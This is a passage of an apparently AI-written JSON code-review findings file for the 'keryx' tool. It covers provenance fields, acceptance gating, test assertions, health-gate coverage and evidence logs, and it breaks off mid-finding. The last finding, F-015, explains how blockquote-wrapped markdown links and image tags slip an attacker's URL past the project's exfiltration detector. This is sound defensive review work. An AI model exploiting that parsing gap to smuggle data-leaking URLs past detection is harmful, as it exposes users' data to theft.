    "evidence": "Same fixture and same query, two forms of one command:\n  $ bun src/cli.ts memory search \"zetaprobe zeta runtime builds\"\n    - provenance: docs/adr/0007.md#L42-L48 (https://example.invalid/adr7) | author: aleks.zeitler | confirmedBy: platform-council (quorum 2026-02-11)\n    - caveat: deferred until the node18 sunset lands\n    (and for the second entry) - provenance: unknown | author: unknown | confirmedBy: unknown\n  $ bun src/cli.ts memory search \"zetaprobe zeta runtime builds\" --json\n    {\"query\":\"...\",\"results\":[{\"score\":2.085,\"title\":\"Adopt zeta runtime\",\"type\":\"decision\",\"status\":\"accepted\",\"path\":\"decisions/sourced.md\"},\n                              {\"score\":2.085,\"title\":\"Zeta lockfile drift\",\"type\":\"lesson\",\"status\":\"accepted\",\"path\":\"decisions/unsourced.md\"}]}",
    "class_scope": {
      "sites": [
        "src/commands/memory.ts:251 — the human text form, `keryx memory search <query>`, rendered by renderSearchMarkdown (src/memory/search.ts:264). ALREADY CORRECT; it is the form the JSON form was weaker than.",
        "src/commands/memory.ts:216-240 — the machine form, `--json`. CARRIED THE SHAPE, FIXED: the payload is now built from renderMemorySearchReport's own per-result projection instead of a hand-rolled five-field literal.",
        "src/commands/memory.ts:174-176 with :263-266 — the `--save-report` markdown form, written by writeReport and reported back as `report: <path>`. Built from the same report projection; ALREADY CORRECT.",
        "src/commands/memory.ts:174-176 with :263-266 — the `--save-report` JSON form (`json: <path>`), the persisted twin of site 3. ALREADY CORRECT.",
        "src/commands/memory.ts:252-262 — the `--as-of` \"## Historical\" appendix printed after the text form, and :227-232, the lifecycle keys spliced into the JSON form. A fifth and sixth output shape of this same command: they must agree with each other, and after T22/T24 they do — state and reasons appear in both.",
        "src/commands/memory.ts:168 — printMemoryValidationError, the error form, which already branches on `--json`. Listed to close the enumeration: it carries no results, so it has no provenance fields to lose."
      ],
      "enumeration_method": "Derived now. The command's own handler was read end to end (src/commands/memory.ts:140-268) rather than searched for, because an output form is a branch of one function, not a symbol: every `console.log` and every writer in runSearch was enumerated, which yields the text form, the --json form, the two --save-report artifacts, the --as-of appendix on each of the first two, and the error form. Cross-checked against `keryx ctx rg 'renderSearchMarkdown|renderMemorySearchReport|writeReport' --glob 'src/**'` to confirm no seventh writer exists outside that function. Verified by running both principal forms over one fixture, /private/tmp/.../scratchpad/fx-mem (one fully provenanced accepted entry, one with no provenance at all): `bun src/cli.ts memory search \"zetaprobe zeta runtime builds\"` and the same command with `--json` now report the identical fields — version 3.4.1, source docs/adr/0007.md#L42-L48, link, author, confirmedBy, caveat — and the unsourced entry carries the literal \"unknown\" in BOTH forms rather than an absent key in one of them."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T24: the JSON payload is built from the report projection, so the machine form carries the same provenance fields and the same unknown sentinel as the text form."
    }
  },
  {
    "id": "F-006",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "file": ".metaproject/flows/234-2026-09-06-agent-first-core-phase-2/flow.json",
    "problem": "Flow 234's AC7 was confirmed on evidence whose own tasks are still open. T12 (\"Независимое ревью лейна graph (AC-10/11/13)\") and T13 (phase acceptance, DELIVERY.md and RESIDUALS.md) are both `todo`, yet AC7's note asserts the full acceptance run and \"два независимых ревью\". Phase 2 has no `artifacts/DELIVERY.md` at all — phases 0 and 1 both have one. `gates.tasks` reads `true` while six of twenty-two tasks are `todo`.",
    "impact": "AC7 is the criterion that says a failed or unrun required check is never relabelled a pass, and partial acceptance is never presented as full. Confirming it while its own acceptance and review tasks are open is the shape the criterion prohibits, applied to itself. A gate reading `gates.tasks: true` alongside six `todo` tasks is reading a value that does not describe the flow.",
    "suggested_fix": "Either close T12 and T13 through the CLI with their evidence recorded (`keryx flow task done 234 T12 ...`, `... T13 ...`) and write `.metaproject/flows/234-.../artifacts/DELIVERY.md` as phases 0 and 1 did, or re-open AC7 (`keryx flow ac update 234 --reason ...`) until they are. Separately, check how `gates.tasks` is computed — a flow with six `todo` tasks should not present a satisfied tasks gate. T1-T4 are unused scaffold tasks; if they are genuinely not applicable, close them with `--disposition skipped` and a reason rather than leaving them `todo`.",
    "evidence": "$ bun src/cli.ts flow status 234\n    status: in-progress / AC: frozen, 7 confirmed / PR: none / Tasks (16/22)\n    · T12 Независимое ревью лейна graph (AC-10/11/13) ... (review)\n    · T13 Приёмка фазы 2: полная сюита, tsc, typecheck:scripts, eslint, health-гейт с хешами; DELIVERY.md и RESIDUALS.md (verify)\n    · T1 Collect remaining context / · T2 Implement per plan / · T3 Add/adjust tests / · T4 Self-review and prepare draft PR\n$ bun -e '... flow.json ...'\n    gates: {\"tasks\":true,\"review\":true}\n    tasks: 22 statuses: {\"todo\":6,\"done\":16}\n$ ls .metaproject/flows/234-*/artifacts/\n    ACCEPT-health-*.log ACCEPT-lint-*.log ACCEPT-suite-*.log ACCEPT-tsc-*.log ACCEPT-tsc-scripts-*.log RESIDUALS.md\n    (no DELIVERY.md; flows 232 and 233 both have one)\nThe acceptance run itself is real: ACCEPT-suite log ends `7262 pass / 19 skip / 0 fail ... Ran 7281 tests across 592 files. [152.82s]`, ACCEPT-health ends `PASS: no gate conditions triggered`.",
    "class_scope": {
      "sites": [
        "flow 234 AC1, confirmed 2026-09-07T07:55:56.659Z — its gating review task T11 (memory/testing lane) was `done`. It did NOT have this problem; it was revoked at 08:44 for a different reason, being wrong on the merits (F-004).",
        "flow 234 AC2, confirmed 2026-09-07T07:55:56.772Z — T11 done. Same disposition as AC1: revoked on the merits (F-003), not on open tasks.",
        "flow 234 AC3, confirmed 2026-09-07T07:55:56.880Z — SAME PROBLEM. T12, titled 'Независимое ревью лейна graph (AC-10/11/13)', is the independent review of exactly this criterion, and it was `todo` at the moment of confirmation.",
        "flow 234 AC4, confirmed 2026-09-07T07:55:56.984Z — SAME PROBLEM, same reason as AC3 (T12 covers AC-11).",
        "flow 234 AC5, confirmed 2026-09-07T07:55:57.089Z — SAME PROBLEM, same reason as AC3 (T12 covers AC-13).",
        "flow 234 AC6, confirmed 2026-09-07T07:55:57.197Z — T11 done. Revoked on the merits (F-002, F-005, F-007), not on open tasks.",
        "flow 234 AC7, confirmed 2026-09-07T07:55:57.325Z — SAME PROBLEM, and the worst instance, because its own note asserts the full acceptance run and 'два независимых ревью' while BOTH T12 (one of the two reviews) and T13 (the acceptance itself, including DELIVERY.md) were `todo`. This is F-006's named site.",
        "flow 234 gates.tasks — read `true` in flow.json while six of twenty-two tasks were `todo`. Not a criterion, but the same claim in the same file, and the reason the batch could be recorded at all."
      ],
      "enumeration_method": "Derived now, from the flow's own history rather than from the report's prose. `bun -e` over .metaproject/flows/234-2026-09-06-agent-first-core-phase-2/flow.json prints every `ac-confirmed` history event with its timestamp; the seven above share a 666-millisecond window (07:55:56.659Z to 07:55:57.325Z) and are therefore the batch, with no eighth event inside it and the next event being the 08:44:18.182Z `ac-updated` revocation. The batch is closed by construction: it is every ac-confirmed event in the flow's history between those two adjacent boundaries, not a selection. Which members shared the problem was decided by matching each criterion against the task that gates it — `bun src/cli.ts flow status 234` gives each task's title and dependency list, and T12's title names AC-10/11/13, which are flow 234's AC3/AC4/AC5 — and by reading the same flow.json's task statuses at that time (six `todo`: T1-T4, T12, T13). It is now 25/26 done with only T13 open, DELIVERY.md exists alongside 232's and 233's, and all seven were re-confirmed at 09:59:34-35Z after the revocation, so the enumeration records the batch's state then and its disposition now."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by the orchestrator: T12 was closed with its actual outcome, the four placeholder tasks were dispositioned as superseded, DELIVERY.md was written, and every confirmation was revoked and re-issued only after the round's findings were closed."
    }
  },
  {
    "id": "F-007",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "file": "src/harness/tool/metaproject-adapter.test.ts",
    "line": 188,
    "problem": "A committed test pins the F-002 defect. `expect(result.hits).toEqual([{path, title, type, status, score, excerpt}])` is an exact-shape assertion on the agent/MCP boundary's memory hit. It fails the moment anyone adds the AC6 provenance fields, so the omission reads as intentional and the correct fix breaks a green test.",
    "impact": "This is the third instance of the pattern this programme has already found twice. It makes the criterion's own repair look like a regression, and it is the reason the AFC-25 lane could report green per-file tests while the model-facing boundary carried no provenance at all. Compounding it, no test asserts `formatMemory`'s output anywhere, so the renderer a model actually reads is uncovered.",
    "suggested_fix": "src/harness/tool/metaproject-adapter.test.ts:188-197 — replace `toEqual` with `toMatchObject` for the six identity fields, and add explicit assertions that the AC6 provenance fields are present and that an entry with no source carries the literal `unknown` sentinel. Add a test for `formatMemory` (src/harness/tool/metaproject-operations.ts:118) asserting the rendered text names the source, version, confirming participant and caveat, and distinguishes a sourced entry from an unsourced one.",
    "evidence": "Direct read of the committed file:\n  188:  expect(result.hits).toEqual([\n  189:    {\n  190:      path: \"decisions/x.md\",\n  191:      title: \"Offline determinism\",\n  192:      type: \"decision\",\n  193:      status: \"accepted\",\n  194:      score: 0.75,\n  195:      excerpt: \"Keep the harness core offline and deterministic.\",\n  196:    },\n  197:  ]);\nDirect read of src/harness/tool/metaproject-operations.ts:118-133 confirms `formatMemory` renders only title, path, score, type/status and excerpt. A search for `formatMemory` in test files returned no matches (run in a sub-review under my direction; the code read is mine).",
    "class_scope": {
      "sites": [
        "src/harness/tool/metaproject-adapter.test.ts:196-203 — the memory hit's identity fields. CARRIED THE SHAPE, FIXED: `toEqual` against a six-field literal replaced by `toMatchObject`, with the provenance fields asserted separately at :207-211. This is F-007's named site.",
        "src/harness/tool/metaproject-adapter.test.ts:142-145 — `result.affected` pinned to a four-field entry {id, path, hop, fanIn}. Still an exact-shape assertion on a port payload; a fifth field on an affected entry would break it.",
        "src/harness/tool/metaproject-adapter.test.ts:158-161 — the whole graphQuery orphans result object pinned exactly.",
        "src/harness/tool/metaproject-adapter.test.ts:164-167 — the whole graphQuery cycles result object pinned exactly.",
        "src/harness/tool/metaproject-adapter.test.ts:208 and :234 — `hits[0].provenance` pinned to exactly {source, link}. A third provenance carrier could not be added without editing these.",
        "src/harness/tool/metaproject-adapter.test.ts:316 and :346-349 — `result.context` pinned to exactly {status, incompleteReasons}. Notable because this is the very field F-003's fix added: the repair for one member of the class was written in the shape of the class.",
        "src/harness/tool/metaproject-adapter.test.ts:379-381 — `flows` pinned to a six-field flow summary.",
        "src/harness/tool/metaproject-adapter.test.ts:490-492 — `definitions` pinned to a six-field symbol definition.",
        "src/harness/tool/metaproject-adapter.test.ts:520 — `files` pinned to {path, score, symbols} on the repomap result.",
        "src/harness/tool/metaproject-adapter.test.ts:547-549 — `citations` pinned to a five-field citation on the wikiAsk result.",
        "src/mcp/mcp.test.ts:235 — the whole parsed MCP graph result pinned to {target, dependencies, dependents}.",
        "src/harness/tool/metaproject-adapter.test.ts:152, :252, :255, :327, :345, :393, :494, :501, :529, :561, :593 — `toEqual([])` on port payloads. Matched by the same search, and deliberately NOT counted as members: an empty-array assertion states that nothing was returned, which is the assertion's actual subject, and it does not forbid a field from being added to a future element.",
        "src/harness/tool/metaproject-adapter.test.ts:314, :577; src/harness/tool/metaproject-operations.test.ts:158, :164, :169, :180, :184; src/harness/tool/builtin/metaproject-tools.test.ts:195, :208, :220 — `toEqual` on recorded CALL arguments, not on results. Also NOT members: pinning what a tool passes down is the point of those tests, and the argument shape is not a boundary the criteria require to grow."
      ],
      "enumeration_method": "Derived now, by searching for the assertion SHAPE across the whole suite rather than for the one file. `keryx ctx rg 'expect\\((?:result|r|res|out|parsed|payload)[^)]*\\)\\.toEqual\\(\\s*[\\[{]' --glob 'src/**/*.test.ts'` returns 409 hits across the suite; `cut -d: -f1 | sort | uniq -c` over that routed raw log ranks the files, and metaproject-adapter.test.ts is second with 22. A second pass, `keryx ctx rg 'toEqual' --glob 'src/harness/tool/metaproject-adapter.test.ts'` (33 hits), plus a grep of the 409-hit log restricted to `harness/tool|src/mcp/`, gives the candidate set at the agent/MCP tool boundary. Every candidate was then opened and read — sites 2-11 above were confirmed by reading the literal at each line — and classified against the class's actual defining property, which is not \"uses toEqual\" but \"forbids a MetaprojectPort result payload from growing a field\". That is why the last two entries exist: they match the search and are excluded on the merits, stated rather than silently dropped. Whole-suite scope is real (409 hits, all files), but the class is bounded to the port boundary; assertions in, say, src/metrics/gold.test.ts pin a fixture's gold answer, which is a shape that must NOT grow."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T23: the exact-shape assertion became a match assertion plus explicit sentinel checks, and the previously untested formatter gained tests."
    }
  },
  {
    "id": "F-008",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "file": "src/health/sources/tests.ts",
    "line": 114,
    "symbol": "parseTestingReport",
    "problem": "The health gate imports the testing report and never reads `report.context`. A `TestingReport` that says `context.status: \"incomplete\"` — the tree could not be fully walked — contributes zero findings to health, and the `tests` source is recorded as completed/parsed with clean coverage.",
    "impact": "The health gate can return PASS over a tree the testing layer explicitly said it could not read. That matters here beyond AC2: flow 234's AC7 was confirmed partly on `Health-гейт PASS, ноль блокирующих строк`, and this is a path by which a health PASS is not evidence that the tree was fully examined. It is the same coverage-vs-findings conflation phase 1 closed elsewhere under AFC-05, left open on this one importer.",
    "suggested_fix": "src/health/sources/tests.ts, inside `parseTestingReport`, before the existing `if (findings.length === 0 && report.status !== \"pass\" ...)` at line 138: when `report.context?.status === \"incomplete\"`, push a finding with `ruleKey: \"testing-context-incomplete\"`, severity `error`, priority `P0`, whose message carries `report.context.incompleteReasons`, so incompleteness cannot be read as clean coverage. Note also line 118-119: a `JSON.parse` failure returns `[]`; confirm the coverage layer separately marks the source unparsed, and if it does not, that is a second instance of the same shape.",
    "evidence": "Direct read of src/health/sources/tests.ts:\n  $ bun -e 'console.log(\"mentions report.context:\", /report\\.context|\\.context\\?\\./.test(src))'\n    mentions report.context: false\n  114: function parseTestingReport(raw: RawSourceResult): Finding[] {\n  116:   try { report = JSON.parse(raw.content) as TestingReport; }\n  118:   catch { return []; }\n  122:   const findings = report.failures.map(...)\n  138:   if (findings.length === 0 && report.status !== \"pass\" && report.status !== \"skipped\") {\nEnd-to-end confirmation was run in a sub-review under my direction: in a fixture whose test run printed `# Test Report: PASS ... context: incomplete`, `keryx health run` produced a `latest.md` with zero matches for `incomplete|EACCES` and a `tests` row reading `available | completed | parsed | 0`. I re-verified the code fact myself; the end-to-end run I did not repeat.",
    "class_scope": {
      "sites": [
        "src/health/sources/tests.ts:114-186 — parseTestingReport, the testing-report importer. CARRIED THE SHAPE, FIXED: `report.context?.status === \"incomplete\"` now pushes a P0 `tests-context-incomplete` finding at :167-184. This is F-008's named site.",
        "src/health/sources/tests.ts:116-120 — the same importer's `JSON.parse` catch returning `[]`, which F-008's own note flagged as a possible second instance. Measured, not assumed: it is UNREACHABLE. The adapter's `import()` at :45-59 sets `content: JSON.stringify(report, null, 2)` from an already-parsed TestingReport, and the non-imported path at :61-64 never calls parseTestingReport, so the catch is dead code rather than a live hole. Recorded as checked and closed.",
        "src/health/sources/sonarqube.ts:45 (adapter), :58-72 (import), :85-89 (parse) — reads sonar-issues.json RAW from disk with `Bun.file(report).text()`, and its `JSON.parse` catch returns `[]`. It declares no `validate()`, so runAdapter has nothing to mark failed. CARRIES THE SHAPE, NOT FIXED — see F-018.",
        "src/health/sources/eslint.ts:30 (adapter), :83-84 and :119-124 (parse and validate) — same JSON-report shape, but it DOES declare `validate()` at :117, which returns {valid:false, error:'ESLint JSON parse failed'} and makes runAdapter record `status: configured-but-failed, parse: failed`. ALREADY CORRECT, and the model site 3 should copy.",
        "src/health/sources/dependency-audit.ts:100 (adapter), :34-36 (parse) and :143 (validate) — same shape, same guard as eslint. ALREADY CORRECT.",
        "src/health/sources/typescript.ts:17 — parses tsc's line-oriented diagnostic output, not a JSON report; there is no parse step that can silently succeed on garbage. NOT A MEMBER, listed to close the set of five health sources.",
        "src/health/run.ts:399-434 — runAdapter itself, which turns `validate()` into `parse: \"failed\"` and otherwise records `available / completed / parsed`. Not an importer, but the layer that decides whether an importer's silence reads as clean coverage, and therefore where the class's severity is set.",
        "src/commands/test.ts:217-248 — runReport, a second importer of the same testing report outside health. ALREADY CORRECT: prints `context: incomplete` and the reasons.",
        "src/commands/test.ts:185-195 — runStatus, a third importer of that report. Renders `latest status: pass` from a report whose context is incomplete, with no context line. CARRIES THE SHAPE, NOT FIXED — see F-017.",
        "src/testing/service.ts:1013 — the report's own markdown renderer, which emits the `context:` line runReport prints. ALREADY CORRECT."
      ],
      "enumeration_method": "Derived now, along two axes, because the class has two halves — importers inside the health gate, and importers of the same report elsewhere. For the first: `ls src/health/sources/` gives the complete adapter set (five: tests, eslint, sonarqube, dependency-audit, typescript — the directory IS the registry, so the set is exhaustive by construction, not by search), then `keryx ctx rg 'JSON.parse|catch' --glob 'src/health/sources/*.ts'` and `keryx ctx rg 'validate' --glob 'src/health/sources/*.ts'` pair each parse-failure path with whether a `validate()` exists to mark it failed — that pairing is what separates eslint and dependency-audit (guarded) from tests and sonarqube (unguarded). For the second: `keryx ctx rg 'loadTestingReport|loadCompatibleTestingReport|report\\.context' --glob 'src/**'` gives every reader of the testing report outside health. Verified by running, on the one member the reading implicated: /private/tmp/.../scratchpad/f008-sonar.ts drives the REAL runAdapter over the REAL sonarqubeAdapter with a corrupt sonar-issues.json, and the source audit comes back {\"status\":\"available\",\"execution\":\"completed\",\"parse\":\"parsed\",\"findings\":0} — an unreadable report recorded as clean coverage. The tests.ts dead-catch claim rests on reading :45-64, not on a run, and is labelled as such above."
    },
    "confidence": "medium",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T25: an incomplete testing context now produces a blocking finding carrying its reasons. The finding's own note about a second instance in the same file was checked and refuted; the live second instance was F-018 on a sibling adapter."
    }
  },
  {
    "id": "F-009",
    "reviewer": "managed-round-2026-09-07",
    "severity": "minor",
    "file": ".metaproject/flows/234-2026-09-06-agent-first-core-phase-2/artifacts/ACCEPT-tsc-2026-09-07T07-51-37Z.log",
    "problem": "Two of the five acceptance evidence logs for phase 2 are zero bytes. `ACCEPT-tsc` and `ACCEPT-lint` both hash to sha256 of the empty string. A clean run and a run that never started, or crashed before emitting anything, produce byte-identical evidence.",
    "impact": "Flow 234's AC7 and flow 233's AC8 both turn on \"no required failed or unrun check is relabelled PASS\". An empty log cannot distinguish the two, so the evidence for two of five required checks does not support the claim it is cited for. The sibling `ACCEPT-tsc-scripts` log shows the fix already exists in the same batch: it records the command line.",
    "suggested_fix": "When capturing acceptance evidence, always write the command line and the process exit code into the log even when the tool is silent — as `ACCEPT-tsc-scripts-2026-09-07T07-51-37Z.log` already does with its `$ tsc --project tsconfig.scripts.json --noEmit` line. Regenerate the two empty logs, or annotate them with the exit code, before citing them as immutable evidence.",
    "evidence": "$ bun -e '... shasum each ACCEPT-*.log ...'\n  ACCEPT-tsc-scripts-2026-09-07T07-51-37Z.log  lines=2   sha256=b93b65b9afcd13e9   ($ tsc --project tsconfig.scripts.json --noEmit)\n  ACCEPT-health-2026-09-07T07-51-37Z.log       lines=12  sha256=a723d3b39ee9bb5d   (PASS: no gate conditions triggered)\n  ACCEPT-suite-2026-09-07T07-51-37Z.log        lines=1254 sha256=81769b1cff30ad86  (7262 pass / 19 skip / 0 fail)\n  ACCEPT-tsc-2026-09-07T07-51-37Z.log          lines=1   sha256=e3b0c44298fc1c14   <-- sha256 of the empty string\n  ACCEPT-lint-2026-09-07T07-51-37Z.log         lines=1   sha256=e3b0c44298fc1c14   <-- sha256 of the empty string",
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by the orchestrator: evidence capture now writes the command, the working directory and the exit code into each log, so an empty output stays checkable. The two zero-byte logs were replaced."
    }
  },
  {
    "id": "F-010",
    "reviewer": "managed-round-2026-09-07",
    "severity": "minor",
    "file": "src/flow/review-gate.ts",
    "line": 1300,
    "problem": "The completion gate's `ingested-round` condition reads a managed review PACKAGE under `.metaproject/flows/<flowDir>/reviews/`. No such directory exists for flow 232, 233 or 234. This report, written to `.metaproject/reviews/round-2026-09-07.md` as instructed, is a standalone document at a different path and will not satisfy that condition — nor the three conditions derived from it (`terminal-dispositions`, `head-commit`, `verifier-stats`).",
    "impact": "The premise that this round \"becomes the recorded review round a completion gate reads\" does not hold as written. Of the reasons `flow complete` refused on 2026-09-07T06:36, two are now genuinely addressed — health is PASS, and flow 233's AC5 is confirmed (though F-001 says that confirmation is wrong) — and a PR-comment record for #489 now exists where none did. The review conditions are not addressed and the gate will still refuse.",
    "suggested_fix": "Record this round through `keryx review` so it lands as a managed package under `.metaproject/flows/232-.../reviews/<review-id>/` (and likewise for 233 and 234), then ingest it, rather than as a single markdown file under `.metaproject/reviews/`. Also re-run `keryx review comments collect --repo MrCipherSmith/keryx --pr 489 --sha <current pr head>`: the stored record's `collected_sha` is `8e94a737`, the phase 0/1 merge, which predates the phase 2 commits `25519cce` and `afcd9637`.",
    "evidence": "$ ls -d .metaproject/flows/{232,233,234}-*/reviews\n  ls: .metaproject/flows/232-*/reviews: No such file or directory\n  ls: .metaproject/flows/233-*/reviews: No such file or directory\n  ls: .metaproject/flows/234-*/reviews: No such file or directory\nsrc/flow/review-gate.ts:1300-1307 — `if (rounds.length === 0) conditions.push({ id: \"ingested-round\", status: \"unobserved\", detail: `no managed review package exists under .metaproject/flows/${input.flowDir}/reviews/` ... })`, and the module's rule is that `unobserved` fails.\nRecorded gate refusal, flow 232 history: `completion-failed: review: 5 of 5 conditions failed — ingested-round (unobserved) ... | health: FAIL: 14 finding(s) at P0`.\nCurrent health, read from the stored artifact: `gate: {\"status\":\"pass\",\"reasons\":[\"OPTIONAL: sonarqube source skipped\",\"PASS: no gate conditions triggered\"],\"coverage\":\"complete\"}` (generatedAt 2026-09-07T07:55:26.354Z).\nComment record: .metaproject/reviews/pr-comments/MrCipherSmith__keryx__489.json exists with `\"collected_sha\": \"8e94a737de19674d5d884822dbab70949dadd66c\"`. Whether `external-comments` passes also depends on resolving the PR head, which needs network; I did not exercise it.",
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by the orchestrator: keryx review attach wrote a managed review package under all three flow directories, which is what the completion gate reads."
    }
  },
  {
    "id": "F-011",
    "reviewer": "managed-round-2026-09-07",
    "severity": "minor",
    "file": "src/wiki/ask.ts",
    "line": 373,
    "symbol": "wikiCandidates",
    "problem": "A load-bearing comment is false. Lines 373-379 state that `collect.ts` recognises only the unhyphenated spelling, so a page written with the memory-style `Valid-From` alias \"is no longer honored on this path\", and record that as an unfixed residual. `collect.ts` honours both spellings.",
    "impact": "Documentation-grade, but the comment records a fail-open that does not exist, in the file a future reviewer will read first when re-auditing AC1. A reader acting on it would either re-fix something already correct or, worse, trust the surrounding comments' accuracy about things that are wrong.",
    "suggested_fix": "src/wiki/ask.ts:373-379 — delete the \"one real loss\" paragraph, or restate it as closed, citing src/wiki/collect.ts:69-71.",
    "evidence": "src/wiki/collect.ts:69-71 reads:\n  validFrom: field(lines, \"ValidFrom\") ?? field(lines, \"Valid-From\"),\n  validTo: field(lines, \"ValidTo\") ?? field(lines, \"Valid-To\"),\n  supersededBy: field(lines, \"SupersededBy\") ?? field(lines, \"Superseded-By\"),\nand its own comment says \"Both spellings, because the two surfaces disagree and always have\". Flow 234's T18 is titled \"...принять оба написания полей Valid-From и ValidFrom\", so the fix landed after the ask.ts comment was written.",
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T24: the comment claiming the collector recognises one spelling was corrected; the collector accepts both, and an existing test proves it end to end."
    }
  },
  {
    "id": "F-012",
    "reviewer": "managed-round-2026-09-07",
    "severity": "info",
    "file": "package.json",
    "problem": "The two dependency overrides forced past their parents' declared ceilings — `protobufjs` 7.6.6 under `onnx-proto@4.0.4`'s `^6.8.8`, and `sharp` 0.35.4 under `@xenova/transformers@2.17.2`'s `^0.32.0` — both load without error in this environment. The recorded risk is real in principle but narrower than the RESIDUALS entry implies at module-load level.",
    "impact": "None observed. The residual asks the owner of src/memory/embedding/adapter.ts to run the path manually; that remains sensible, since I exercised module load only, not inference.",
    "suggested_fix": "Update the RESIDUALS row to record that module load was measured and passes, and narrow the open question to actual inference. If the concern is that a broken capability degrades silently, note that the rerank path catches everything and falls back to lexical order (src/wiki/ask.ts:495-497), so a broken embedding backend is indistinguishable from one that was never configured.",
    "evidence": "$ bun -e 'require(\"onnx-proto\")' -> LOADED ok, keys: onnx\n$ bun -e 'await import(\"@xenova/transformers\")' -> LOADED ok, has pipeline: function\n$ bun -e 'require(\"sharp\")' -> sharp LOADED 0.35.4\nParents confirmed from bun.lock: `onnx-proto@4.0.4` deps `{\"protobufjs\":\"^6.8.8\"}`; `@xenova/transformers@2.17.2` deps `{... \"sharp\":\"^0.32.0\"}`. Installed: protobufjs 7.6.6, sharp 0.35.4. Not exercised: actual inference through the embedding adapter.",
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Recorded rather than changed. The two overrides are named in flow 234 RESIDUALS.md as untested combinations, with the reason no fix exists in the branch each parent allows. The verifier established both load in this environment, which narrows the risk without removing it."
    }
  },
  {
    "id": "F-013",
    "reviewer": "managed-round-2026-09-07",
    "severity": "info",
    "file": "src/testing/service.ts",
    "line": 144,
    "problem": "The open cost question in flow 234's RESIDUALS (\"Не измерено\" — the cost of dropping the testing-snapshot cache was never measured) is now measured, and the answer does not support the proposed remedy.",
    "impact": "None. The uncached walk costs about +15.5 ms per call against a cached read of about 0.14 ms, over 330 directories and 2192 files on this repository — but that is only about a quarter of one `findRelatedTests` call; the rest is the pre-existing import scan (~65 ms). No caller invokes either function in a loop.",
    "suggested_fix": "Close the RESIDUALS row \"ensureContext / findRelatedTests\" as measured and not worth an mtime cache. If latency ever matters, the target is `findTestsByImportedTargets` (src/testing/service.ts:759-776), which reads all 592 test files sequentially with an `await pathExists` followed by an `await readFile`; batching with `Promise.all`, or dropping the redundant `pathExists` since the `readFile` catch already covers it, attacks the 65 ms rather than the 18 ms.",
    "evidence": "Measured in a sub-review under my direction, on this repository: `loadTestingContext` (cached read) median 0.14 ms; `computeTestingContext` (full walk) median 15.65 ms; `relatedTestsInContext` median 65.2 ms; one `findRelatedTests` median 63.8 ms; ten sequential calls 595 ms vs 451 ms against one shared context. Caller inventory (exhaustive symbol search): `ensureContext` one call site (src/testing/service.ts:144, in `runTesting`, not a loop); `findRelatedTests` four call sites (src/commands/test.ts:257, src/commands/test.ts:278, src/harness/tool/metaproject-adapter.ts:503, and the test file), all single-target, none in a loop. I did not re-run the timings myself.",
    "confidence": "medium",
    "disposition": {
      "state": "acted-on",
      "evidence": "Recorded in flow 234 RESIDUALS.md. The verifier re-ran the measurements and two of them did not reproduce: the walk is about a third of a call rather than a quarter, and the ten-call comparison inverted. The conclusion survives, the numbers do not, and that correction is recorded with it."
    }
  },
  {
    "id": "F-014",
    "reviewer": "managed-round-2026-09-07",
    "severity": "info",
    "problem": "The commit under review moved during the review. HEAD advanced from `65def515` to `0ae1456b` about two minutes into the session, from a concurrent session sharing this checkout.",
    "impact": "None on the findings — `git diff --name-only 65def515 HEAD -- src/` is empty, so every finding above holds at both commits. It does mean the premise \"the working tree is clean and matches 65def515\" was true only at the moment I checked it, and a later reader comparing this report against a moving branch should re-establish the base.",
    "suggested_fix": "Run concurrent flow work in git worktrees, as this project's own memory already records. For this round, note in the flow journal that the review base is `65def515` and that `0ae1456b` (a test timeout budget in scripts/typecheck.test.ts) landed during it.",
    "evidence": "At session start: `git rev-parse HEAD` -> 65def5156aa8b67233d6c7f91cd93b3d26783fd7, `git status --porcelain` -> clean.\nLater in the same session: `git rev-parse HEAD` -> 0ae1456b76ff1752d466972f4d489c5917d20179, `git status --porcelain` -> ` M .metaproject/data/gdgraph/.provenance.json` (my own ctx routing).\n`keryx ctx run -- git diff --name-status 65def515 0ae1456b` -> `M\tscripts/typecheck.test.ts` (only).\n`keryx ctx run -- git diff --name-only 65def515 HEAD -- src/` -> no output.\nCommit 0ae1456b dated 2026-09-07 12:25:12 +0400, authored by MrCipherSmith, message \"test(scripts): give the compiler-spawning typecheck tests an explicit budget\".",
    "confidence": "high",
    "disposition": {
      "state": "dismissed-out-of-scope",
      "evidence": "A statement about session concurrency during the review, not a defect in the code under review. The repository-side facts were confirmed by the verifier; the attribution to a concurrent session is not checkable from the repository and was not asserted. Recorded, not acted on."
    }
  },
  {
    "id": "F-015",
    "reviewer": "managed-round-2026-09-07",
    "severity": "blocker",
    "blocking_merge": true,
    "file": "src/security/detect/exfil.ts",
    "line": 1681,
    "symbol": "readInlineDestination",
    "problem": "FOUND WHILE ENUMERATING F-001's CLASS; not a restatement of F-001. The class is \"readers that cross a line terminator while reading a markdown construct and must consume a repeated container marker\". T89 taught the definition-line opening, T90 the reference destination, T91 (the F-001 repair) the label text. Two further members were never taught it, and both are live. `readInlineDestination` (src/security/detect/exfil.ts:1681) matches INLINE_DESTINATION, `/\\(\\s*(?:<([^<>\\n]*)>|([^)\\s]+))[^)]*\\)/y` (:753): the leading `\\s*` crosses the newline and then stops at the repeated `>`, so `([^)\\s]+)` captures the container marker itself as the destination and the attacker's URL is swallowed by `[^)]*`. `readStartTag` (:1968) has the same defect through `isHtmlSpace`, which accepts a line terminator: an `<img>` whose attributes wrap inside a blockquote has its tag terminated at the repeated `>` marker, so the `src` attribute is never read. `skipBlockContainerPrefix` has exactly three call sites (:830, :948, :1286); neither of these two is among them.",
